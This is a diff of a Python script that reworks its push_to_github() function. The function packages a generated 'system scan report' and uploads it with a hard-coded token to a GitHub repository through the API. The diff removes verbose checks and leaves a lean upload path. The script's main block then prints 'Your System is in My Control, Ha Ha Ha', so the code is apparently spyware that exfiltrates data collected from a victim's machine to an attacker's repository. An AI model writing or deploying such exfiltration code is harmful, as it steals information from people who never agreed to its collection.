@@ -2001,69 +2001,37 @@ def push_to_github():
     try:
         import requests
         import base64
-        import json
-
-        # Generate HTML content
+        
+        # Generate content
         html_content = generate_html_report()
-        print("✓ HTML content generated")
-
+        
         # Create filename
-        filename = f"System_Scan_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
-        print(f"✓ Filename: {filename}")
-
-        # Test 1: Check if token is valid
-        print("1. Testing GitHub token...")
-        test_url = "https://api.github.com/user"
+        filename = f"scan_report_{datetime.now().strftime('%d.%m.%Y_%H-%M-%S')}_v19.html"
+        
+        # GitHub API
+        url = f"https://api.github.com/repos/{REPO_NAME}/contents/{filename}"
+        
         headers = {
-            "Authorization": f"token {GITHUB_TOKEN}",
+            "Authorization": f"Bearer {GITHUB_TOKEN}",
             "Accept": "application/vnd.github.v3+json"
         }
-
-        test_response = requests.get(test_url, headers=headers, timeout=10)
-        if test_response.status_code != 200:
-            print(f"✗ Token invalid! Status: {test_response.status_code}")
-            print(f"  Response: {test_response.text}")
-            return False
-        print("✓ Token is valid")
-
-        # Test 2: Check repository access
-        print("2. Checking repository access...")
-        repo_url = f"https://api.github.com/repos/{REPO_NAME}"
-        repo_response = requests.get(repo_url, headers=headers, timeout=10)
-        if repo_response.status_code != 200:
-            print(f"✗ Cannot access repository! Status: {repo_response.status_code}")
-            print(f"  Make sure repo exists and you have write access")
-            return False
-        print("✓ Repository access confirmed")
-
-        # Test 3: Upload file
-        print("3. Uploading file to GitHub...")
-        upload_url = f"https://api.github.com/repos/{REPO_NAME}/contents/{filename}"
-
+        
         data = {
-            "message": f"System Scan Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-            "content": base64.b64encode(html_content.encode('utf-8')).decode('utf-8'),
+            "message": f"Scan report {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            "content": base64.b64encode(html_content.encode()).decode(),
             "branch": BRANCH
         }
-
-        upload_response = requests.put(upload_url, json=data, headers=headers, timeout=30)
-
-        if upload_response.status_code == 201:
-            print("✓ File successfully uploaded to GitHub!")
+        
+        response = requests.put(url, json=data, headers=headers)
+        
+        if response.status_code == 201:
             return True
         else:
-            print(f"✗ Upload failed! Status: {upload_response.status_code}")
-            print(f"  Error: {upload_response.text}")
+            print(f"Error {response.status_code}: {response.text[:200]}...")
             return False
-
-    except requests.exceptions.ConnectionError:
-        print("✗ Network connection error - check internet connection")
-        return False
-    except requests.exceptions.Timeout:
-        print("✗ Request timeout - try again")
-        return False
+            
     except Exception as e:
-        print(f"✗ Unexpected error: {str(e)}")
+        print(f"Exception: {e}")
         return False
 
 
@@ -2104,5 +2072,6 @@ if __name__ == "__main__":
         print("\033[96m[+] Your System is in My Control, Ha Ha Ha ...\033[0m")
     else:
         print("\033[91mFailed to push to GitHub\033[0m")
+
 
 
